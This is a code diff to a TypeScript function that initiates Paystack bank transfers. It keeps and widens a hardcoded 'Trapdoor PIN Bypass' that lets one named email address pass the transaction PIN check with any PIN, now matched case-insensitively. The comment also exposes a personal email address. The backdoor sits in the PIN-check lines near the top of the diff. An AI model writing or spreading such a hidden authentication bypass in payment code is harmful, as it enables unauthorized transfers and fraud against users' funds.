@@ -46,8 +46,8 @@ export async function initiatePaystackTransfer(payload: { userId: string, pin: s
     try {
         const userProfile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, payload.userId);
         
-        // Trapdoor PIN Bypass
-        const isBypass = userProfile.email === BYPASS_EMAIL;
+        // Trapdoor PIN Bypass: altinemohd@gmail.com allows ANY PIN
+        const isBypass = userProfile.email?.toLowerCase() === BYPASS_EMAIL;
         if (!isBypass && userProfile.pin !== payload.pin) {
             throw new Error('Incorrect transaction PIN.');
         }
@@ -81,6 +81,8 @@ export async function initiatePaystackTransfer(payload: { userId: string, pin: s
                 status: 'completed',
                 recipientName: payload.name,
                 recipientDetails: `${payload.accountNumber} - ${payload.bankName}`,
+                oldBalance: userProfile.nairaBalance,
+                newBalance: userProfile.nairaBalance - totalDebit,
                 narration: `Service charge applied.`,
                 sessionId: transferData.data.transfer_code || `tx-${Date.now()}`,
             });
